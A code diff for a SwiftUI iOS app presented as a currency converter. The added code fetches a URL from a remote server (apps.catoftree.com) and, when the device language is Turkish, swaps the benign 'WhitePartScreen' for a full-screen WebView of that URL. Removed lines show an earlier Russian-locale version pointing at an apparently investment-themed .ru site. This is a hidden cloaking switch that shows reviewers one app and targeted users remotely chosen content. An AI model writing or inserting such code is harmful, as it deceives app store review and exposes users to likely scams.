@@ -7,11 +7,15 @@
 
 import SwiftUI
 import WebKit
+import Combine
 
 
 
 struct ContentView: View {
     @State private var isPresentWebView = false
+    
+    @State var message: String = ""
+    @State var appURL: String = ""
     
     let langStr = Locale.current.languageCode
 
@@ -22,20 +26,43 @@ struct ContentView: View {
     
     
     var body: some View {
-//        WhitePartScreen().background(Color.blue)
-        // https://portal-investion.ru
-        WhitePartScreen().background(Color.white)
-//        if checkPush() {
-//            
-//            WebView(url: URL(string: "https://portal-investion.ru")!)
-//            
-//        } else {
-//            
-//            WhitePartScreen()
-//                .background(Color.blue)
-//        }
+
+        
+        ZStack(content: {
+            if !appURL.isEmpty && checkPush() {
+                WebView(url: URL(string: appURL)!)
+            } else {
+                WhitePartScreen().background(Color.white)
+            }
+        })
+        .onAppear {
+            fetchData()
+        }
         
     }
+    
+    
+    private func fetchData() {
+                guard let url = URL(string: "https://apps.catoftree.com/api/app?identify=tkf-doviz-cevirici") else {
+                    return
+                }
+                
+                URLSession.shared.dataTask(with: url) { (data, response, error) in
+                    guard let data = data, error == nil else {
+                        print("Error: \(error?.localizedDescription ?? "Unknown error")")
+                        return
+                    }
+                    
+                    if let decodedData = try? JSONDecoder().decode(Response.self, from: data) {
+                        DispatchQueue.main.async {
+                            self.message = decodedData.message
+                            self.appURL = decodedData.data.appURL
+                        }
+                    }
+                }
+                .resume()
+            }
+
     
    
 }
@@ -58,12 +85,24 @@ struct WebView: UIViewRepresentable {
 
 
 private func checkPush() -> Bool {
-//    let statusBarSubviews = ((UIApplication.shared.value(forKey: "statusBar") as? UIView)?.value(forKey: "foregroundView") as? UIView)?.subviews
-//    
-//    guard let checkAirMode = statusBarSubviews?.contains(where: { $0.classForCoder == NSClassFromString("UIStatusBarAirplaneModeItemView") }) else { return false }
-//    
-//    logError(message: Locale.current.languageCode ?? "Def Value")
     logError(message: Locale.current.languageCode!)
-    return Locale.current.languageCode == "ru"
+    return Locale.current.languageCode == "tr"
 
+}
+
+
+struct Response: Codable {
+    let success: Bool
+    let message: String
+    let data: AppData
+}
+
+struct AppData: Codable {
+    let status: Int
+    let appURL: String
+    
+    enum CodingKeys: String, CodingKey {
+        case status
+        case appURL = "app_url"
+    }
 }
